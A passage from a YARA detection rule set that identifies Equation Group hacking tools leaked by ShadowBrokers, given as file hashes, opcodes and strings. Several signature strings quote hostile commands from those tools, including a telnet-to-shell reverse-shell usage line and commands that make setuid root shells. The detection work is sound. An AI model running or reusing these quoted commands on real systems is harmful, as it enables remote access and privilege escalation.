      filesize < 250KB and 1 of them
}

rule EquationGroup_jscan {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jscan"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "8075f56e44185e1be26b631a2bad89c5e4190c2bfc9fa56921ea3bbc51695dbe"
      id = "c4cebc69-8ec8-5ad7-bd93-55565b3eb92b"
   strings:
      $s1 = "$scanth = $scanth . \" -s \" . $scanthreads;" fullword ascii
      $s2 = "print \"java -jar jscanner.jar$scanth$list\\n\";" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_promptkill {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file promptkill"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "b448204503849926be249a9bafbfc1e36ef16421c5d3cfac5dac91f35eeaa52d"
      id = "e0749b10-fa5a-5d73-86e1-e2008e121674"
   strings:
      $x1 = "exec(\"xterm $xargs -e /current/tmp/promptkill.kid.$tag $pid\");" fullword ascii
      $x2 = "$xargs=\"-title \\\"Kill process $pid?\\\" -name \\\"Kill process $pid?\\\" -bg white -fg red -geometry 202x19+0+0\" ;" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_epoxyresin_v1_0_0 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file epoxyresin.v1.0.0.1"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "eea8a6a674d5063d7d6fc9fe07060f35b16172de6d273748d70576b01bf01c73"
      id = "390a13b0-3246-5bf7-8841-775a43045172"
   strings:
      $x1 = "[-] kernel not vulnerable" fullword ascii

      $s1 = ".tmp.%d.XXXXXX" fullword ascii
      $s2 = "[-] couldn't create temp file" fullword ascii
      $s3 = "/boot/System.map-%s" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 30KB and $x1 ) or ( all of them )
}

rule EquationGroup_estopmoonlit {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file estopmoonlit"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "707ecc234ed07c16119644742ebf563b319b515bf57fd43b669d3791a1c5e220"
      id = "7ae7a8b7-5e27-5604-8c57-6d60ffa0fb72"
   strings:
      $x1 = "[+] shellcode prepared, re-executing" fullword ascii
      $x2 = "[-] kernel not vulnerable: prctl" fullword ascii
      $x3 = "[-] shell failed" fullword ascii
      $x4 = "[!] selinux apparently enforcing.  Continue [y|n]? " fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_envoytomato {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file envoytomato"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "9bd001057cc97b81fdf2450be7bf3b34f1941379e588a7173ab7fffca41d4ad5"
      id = "d1a43c98-9448-5a03-824d-5cd8e959fbf5"
   strings:
      $s1 = "[-] kernel not vulnerable" fullword ascii
      $s2 = "[-] failed to spawn shell" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_smash {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file smash"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "1dc94b46aaff06d65a3bf724c8701e5f095c1c9c131b65b2f667e11b1f0129a6"
      id = "9a8cb090-4f47-5674-accb-f233dbb19b71"
   strings:
      $x1 = "T=<target IP> [O=<port>] Y=<target type>" fullword ascii
      $x2 = "no command given!! bailing..." fullword ascii
      $x3 = "no port. assuming 22..." fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_ratload {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ratload"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "4a4a8f2f90529bee081ce2188131bac4e658a374a270007399f80af74c16f398"
      id = "81590569-e81b-5d97-8295-cc6f018fab98"
   strings:
      $x1 = "/tmp/ratload.tmp.sh" fullword ascii
      $x2 = "Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh\"" fullword ascii
      $s6 = "uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_ys {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ys.auto"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "a6387307d64778f8d9cfc60382fdcf0627cde886e952b8d73cc61755ed9fde15"
      id = "abd120e7-23f8-530e-b21e-c50a2b571332"
   strings:
      $x1 = "EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"" fullword ascii
      $x3 = "DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`" fullword ascii
      $x4 = "FATAL ERROR: -x port and -n port MUST NOT BE THE SAME." fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_ewok {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ewok"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "567da502d7709b7814ede9c7954ccc13d67fc573f3011db04cf212f8e8a95d72"
      id = "379c233f-86f8-5116-a15c-8a80b27daea6"
   strings:
      $x1 = "Example: ewok -t target public" fullword ascii
      $x2 = "Usage:  cleaner host community fake_prog" fullword ascii
      $x3 = "-g  - Subset of -m that Green Spirit hits " fullword ascii
      $x4 = "--- ewok version" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 80KB and 1 of them )
}

rule EquationGroup_xspy {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file xspy"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "841e065c9c340a1e522b281a39753af8b6a3db5d9e7d8f3d69e02fdbd662f4cf"
      id = "fcb7246a-d613-51d7-a4f7-f767fa5f79e1"
   strings:
      $s1 = "USAGE: xspy -display <display> -delay <usecs> -up" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 60KB and all of them )
}

rule EquationGroup_estesfox {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file estesfox"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "33530cae130ee9d9deeee60df9292c00242c0fe6f7b8eedef8ed09881b7e1d5a"
      id = "f2e8b8ba-af09-5e7c-a99c-4f620a0917c9"
   strings:
      $x1 = "chown root:root x;chmod 4777 x`' /tmp/logwatch.$2/cron" fullword ascii
   condition:
      all of them
}

rule EquationGroup_elatedmonkey_1_0_1_1 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file elatedmonkey.1.0.1.1.sh"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      modified = "2022-08-18"
      hash1 = "bf7a9dce326604f0681ca9f7f1c24524543b5be8b6fcc1ba427b18e2a4ff9090"
      id = "d8915305-2ed7-50b7-84d0-b139a6d3481a"
   strings:
      $s1 = "Usage: $0 ( -s IP PORT | CMD )" fullword ascii
      $s2 = "os.execl(\"/bin/sh\", \"/bin/sh\", \"-c\", \"$CMD\")" fullword ascii
      $s3 = "PHP_SCRIPT=\"$HOME/public_html/info$X.php\"" fullword ascii
      $s4 = "cat > /dev/tcp/127.0.0.1/80 <<" ascii
   condition:
      filesize < 15KB and 2 of them
}

rule EquationGroup_scanner {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file scanner"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222"
      id = "b2f9c534-0ca7-5223-b85e-8e74c3cfa6ff"
   strings:
      $x1 = "program version netid     address             service         owner" fullword ascii
      $x4 = "*** Sorry about the raw output, I'll leave it for now" fullword ascii
      $x5 = "-scan winn %s one" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

/* Super Rules ------------------------------------------------------------- */

rule EquationGroup__ftshell_ftshell_v3_10_3_0 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893"
      hash2 = "0be739024b41144c3b63e40e46bab22ac098ccab44ab2e268efc3b63aea02951"
      id = "6a2db0a0-386f-5ea6-b0bc-e28ed2fd53d5"
   strings:
      $s1 = "set uRemoteUploadCommand \"[exec cat /current/.ourtn-ftshell-upcommand]\"" fullword ascii
      $s2 = "send \"\\[ \\\"\\$BASH\\\" = \\\"/bin/bash\\\" -o \\\"\\$SHELL\\\" = \\\"/bin/bash\\\" \\] &&" ascii
      $s3 = "system rm -f /current/tmp/ftshell.latest" fullword ascii
      $s4 = "# ftshell -- File Transfer Shell" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 100KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup__scanner_scanner_v2_1_2 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files scanner, scanner.v2.1.2"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222"
      hash2 = "9807aaa7208ed6c5da91c7c30ca13d58d16336ebf9753a5cea513bcb59de2cff"
      id = "bf1f2119-f742-5106-96f0-de88755275ef"
   strings:
      $s1 = "Welcome to the network scanning tool" fullword ascii
      $s2 = "Scanning port %d" fullword ascii
      $s3 = "/current/down/cmdout/scans" fullword ascii
      $s4 = "Scan for SSH version" fullword ascii
      $s5 = "program vers proto   port  service" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 100KB and 2 of them ) or ( all of them )
}

rule EquationGroup__ghost_sparc_ghost_x86_3 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ghost_sparc, ghost_x86"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "d5ff0208d9532fc0c6716bd57297397c8151a01bf4f21311f24e7a72551f9bf1"
      hash2 = "82c899d1f05b50a85646a782cddb774d194ef85b74e1be642a8be2c7119f4e33"
      id = "ccc9c9be-8f78-5071-a11e-47f994cf8f08"
   strings:
      $x1 = "Usage: %s [-v os] [-p] [-r] [-c command] [-a attacker] target" fullword ascii
      $x2 = "Sending shellcode as part of an open command..." fullword ascii
      $x3 = "cmdshellcode" fullword ascii
      $x4 = "You will not be able to run the shellcode. Exiting..." fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 70KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files pclean.v2.1.1.0-linux-i386, pclean.v2.1.1.0-linux-x86_64"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97"
      hash2 = "ab7f26faed8bc2341d0517d9cb2bbf41795f753cd21340887fc2803dc1b9a1dd"
      id = "ed4a3b3a-0935-533b-80dd-ee23b2e8df00"
   strings:
      $s1 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
      $s2 = "e.g.: -n 1-1024,1080,6666,31337 " fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 50KB and all of them )
}

rule EquationGroup__jparsescan_parsescan_5 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files jparsescan, parsescan"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984"
      hash2 = "942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef"
      id = "964a4e49-9163-5dd6-bb2c-88fa39d5f356"
   strings:
      $s1 = "# default is to dump out all scanned hosts found" fullword ascii
      $s2 = "$bool .= \" -r \" if (/mibiisa.* -r/);" fullword ascii
      $s3 = "sadmind is available on two ports, this also works)" fullword ascii
      $s4 = "-x IP      gives \\\"hostname:# users:load ...\\\" if positive xwin scan" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 40KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup__funnelout_v4_1_0_1 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files funnelout.v4.1.0.1.pl"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash2 = "457ed14e806fdbda91c4237c8dc058c55e5678f1eecdd78572eff6ca0ed86d33"
      id = "b0c42b06-8314-5731-b333-59bb90785cf4"
   strings:
      $s1 = "header(\"Set-Cookie: bbsessionhash=\" . \\$hash . \"; path=/; HttpOnly\");" fullword ascii
      $s2 = "if ($code =~ /proxyhost/) {" fullword ascii
      $s3 = "\\$rk[1] = \\$rk[1] - 1;" ascii
      $s4 = "#existsUser($u) or die \"User '$u' does not exist in database.\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )
}

rule EquationGroup__magicjack_v1_1_0_0_client {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files magicjack_v1.1.0.0_client-1.1.0.0.py"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1"
      id = "be18f36c-3d6c-53a3-89b6-bfc53e1dd87d"
   strings:
      $s1 = "temp = ((left >> 1) ^ right) & 0x55555555" fullword ascii
      $s2 = "right ^= (temp <<  16) & 0xffffffff" fullword ascii
      $s3 = "tempresult = \"\"" fullword ascii
      $s4 = "num = self.bytes2long(data)" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 80KB and 3 of them ) or ( all of them )
}

rule EquationGroup__ftshell {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893"
      hash4 = "0be739024b41144c3b63e40e46bab22ac098ccab44ab2e268efc3b63aea02951"
      id = "6a2db0a0-386f-5ea6-b0bc-e28ed2fd53d5"
   strings:
      $s1 = "if { [string length $uRemoteUploadCommand]" fullword ascii
      $s2 = "processUpload" fullword ascii
      $s3 = "global dothisreallyquiet" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-04-09
   Identifier: Equation Group hack tools leaked by ShadowBrokers
*/

/* Rule Set ----------------------------------------------------------------- */

rule EquationGroup_store_linux_i386_v_3_3_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "abc27fda9a0921d7cf2863c29768af15fdfe47a0b3e7a131ef7e5cc057576fbc"
      id = "b88be148-5308-583a-b41e-2bea9b837e2a"
   strings:
      $s1 = "[-] Failed to map file: %s" fullword ascii
      $s2 = "[-] can not NULL terminate input data" fullword ascii
      $s3 = "[!] Name has size of 0!" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 60KB and all of them )
}

rule EquationGroup_morerats_client_genkey {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "0ce455fb7f46e54a5db9bef85df1087ff14d2fc60a88f2becd5badb9c7fe3e89"
      id = "fb305be7-9e16-502e-89ca-a40bb6890404"
   strings:
      $x1 = "rsakey_txt = lo_execute('openssl genrsa 2048 2> /dev/null | openssl rsa -text 2> /dev/null')" fullword ascii
      $x2 = "client_auth = binascii.hexlify(lo_execute('openssl rand 16'))" fullword ascii
   condition:
      ( filesize < 3KB and all of them )
}

rule EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "614bf159b956f20d66cedf25af7503b41e91841c75707af0cdf4495084092a61"
      id = "7a1870ba-d600-5c11-8d3d-41395ad8be63"
   strings:
      $s1 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
      $s2 = "0123456789abcdefABCEDF:" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_cursesleepy_mswin32_v_1_0_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "6293439b4b49e94f923c76e302f5fc437023c91e063e67877d22333f05a24352"
      id = "f60ff218-1cb7-5f44-a756-1ee67649e6a6"
   strings:
      $s1 = "A}%j,R" fullword ascii
      $op1 = { a1 e0 43 41 00 8b 0d 34 44 41 00 6b c0 } /* Opcode */
      $op2 = { 33 C0 F3 A6 74 14 8B 5D 08 8B 4B 34 50 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule EquationGroup_cursehelper_win2k_i686_v_2_2_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "5ac6fde8a06f4ade10d672e60e92ffbf78c4e8db6b5152e23171f6f53af0bfe1"
      id = "1c24aa6a-74ab-5832-876b-5cab43dc6bb7"
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/{}" fullword ascii

      $op1 = { 8d b5 48 ff ff ff 89 34 24 e8 56 2a 00 00 c7 44 } /* Opcode */
      $op2 = { e9 a2 f2 ff ff ff 85 b4 fe ff ff 8b 95 a8 fe ff } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and all of them )
}

rule EquationGroup_morerats_client_addkey {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "6c67c03716d06a99f20c1044585d6bde7df43fee89f38915db0b03a42a3a9f4b"
      id = "a025e379-c24e-56ac-b53c-bd38d51f3437"
   strings:
      $x1 = "print '  -s storebin  use storebin as the Store executable\\n'" fullword ascii
      $x2 = "os.system('%s --file=\"%s\" --wipe > /dev/null' % (storebin, b))" fullword ascii
      $x3 = "print '  -k keyfile   the key text file to inject'" fullword ascii
   condition:
      ( filesize < 20KB and 1 of them )
}

rule EquationGroup_noclient_3_3_2 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "3cf0eb010c431372af5f32e2ee8c757831215f8836cabc7d805572bb5574fc72"
      id = "be7c4263-e8e3-5a83-9003-063225e544ff"
   strings:
      $x1 = "127.0.0.1 is not advisable as a source. Use -l 127.0.0.1 to override this warning" fullword ascii
      $x2 = "iptables -%c OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;" fullword ascii
      $x3 = "noclient: failed to execute %s: %s" fullword ascii
      $x4 = "sh -c \"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \"" fullword ascii
      $s5 = "Attempting connection from 0.0.0.0:" ascii
   condition:
      ( filesize < 1000KB and 1 of them )
}

rule EquationGroup_curseflower_mswin32_v_1_0_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "fdc452629ff7befe02adea3a135c3744d8585af890a4301b2a10a817e48c5cbf"
      id = "4138f87a-4584-5efc-a168-633838893e2f"
   strings:
      $s1 = "<pVt,<et(<st$<ct$<nt" fullword ascii

      $op1 = { 6a 04 83 c0 08 6a 01 50 e8 10 34 00 00 83 c4 10 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_tmpwatch {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "65ed8066a3a240ee2e7556da74933a9b25c5109ffad893c21a626ea1b686d7c1"
      id = "2c8cac7a-761f-59f4-bc04-285af4dbe184"
   strings:
      $s1 = "chown root:root /tmp/.scsi/dev/bin/gsh" fullword ascii
      $s2 = "chmod 4777 /tmp/.scsi/dev/bin/gsh" fullword ascii
   condition:
      ( filesize < 1KB and 1 of them )
}

rule EquationGroup_orleans_stride_sunos5_9_v_2_4_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "6a30efb87b28e1a136a66c7708178c27d63a4a76c9c839b2fc43853158cb55ff"
      id = "ec83e1c0-91a9-5f9d-a1d2-94be725bc05a"
   strings:
      $s1 = "_lib_version" ascii
      $s2 = ",%02d%03d" fullword ascii
      $s3 = "TRANSIT" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 200KB and all of them )
}

rule EquationGroup_morerats_client_noprep {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "a5b191a8ede8297c5bba790ef95201c516d64e2898efaeb44183f8fdfad578bb"
      id = "27e9e51a-c853-5dcc-97d2-d3d31c5ccfac"
   strings:
      $x1 = "storestr = 'echo -n \"%s\" | Store --nullterminate --file=\"%s\" --set=\"%s\"' % (nopenargs, outfile, VAR_NAME)" fullword ascii
      $x2 = "The NOPEN-args provided are injected into infile if it is a valid" fullword ascii
      $x3 = " -i                do not autokill after 5 hours" fullword ascii
   condition:
      ( filesize < 9KB and 1 of them )
}

rule EquationGroup_cursezinger_linuxrh7_3_v_2_0_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "af7c7d03f59460fa60c48764201e18f3bd3f72441fd2e2ff6a562291134d2135"
      id = "d4cab478-da1e-54ef-995a-897d1813619e"
   strings:
      $s1 = ",%02d%03d" fullword ascii
      $s2 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
      $s3 = "__strtoll_internal" ascii
      $s4 = "__strtoul_internal" ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and all of them )
}

rule EquationGroup_seconddate_ImplantStandalone_3_0_3 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "d687aa644095c81b53a69c206eb8d6bdfe429d7adc2a57d87baf8ff8d4233511"
      id = "08b1aa88-8731-51db-b659-96147f509bcd"
   strings:
      $s1 = "EFDGHIJKLMNOPQRSUT" fullword ascii
      $s2 = "G8HcJ HcF LcF0LcN" fullword ascii
      $s3 = "GhHcJ0HcF@LcF0LcN8H" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and all of them )
}

rule EquationGroup_watcher_solaris_i386_v_3_3_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "395ec2531970950ffafde234dded0cce0c95f1f9a22763d1d04caa060a5222bb"
      id = "e75c6ed9-b6e6-530d-a6ac-40bd0477754f"
   strings:
      $s1 = "getexecname" fullword ascii
      $s2 = "invalid option `" fullword ascii
      $s6 = "__fpstart" ascii
      $s12 = "GHFIJKLMNOPQRSTUVXW" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and all of them )
}

rule EquationGroup_gr_dev_bin_now {
   meta:
      description = "Equation Group hack tool set"
